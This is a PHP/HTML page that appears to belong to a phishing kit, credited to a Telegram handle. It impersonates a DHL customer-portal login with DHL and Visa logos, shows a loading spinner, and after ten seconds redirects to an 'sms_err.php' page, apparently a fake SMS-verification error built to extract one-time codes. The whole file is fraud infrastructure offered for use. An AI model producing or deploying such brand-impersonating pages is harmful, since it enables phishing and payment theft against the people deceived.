<?php 

     require_once "functions.php";

                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Login to Customer Portals and Tools | DHL |</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/posta.css">
		


</head>
<body >


		<!-- Modal -->
        <div class="modal fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;">
          <div class="modal-dialog shadow">
            <div class="modal-content">
              <div class="modal-header">
                    <img src="image/dhl-logo.svg">
                  <img src="image/viza.svg" class="sfli">
              </div>
              <div class="modal-body">
                  <div class="text-center py-4 "><img src="image/loading.gif"></div>
                  <div class="copirayt text-center">
                     <p>2022 © - all rights reserved</p>
                  </div>
              </div>
            </div>
          </div>
        </div>

		


        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/Bootstrap.js"></script>
        <script>

            setTimeout(function () {
                window.location.href= 'sms_err.php';
            },10000);
             
        </script>
</body>
</html>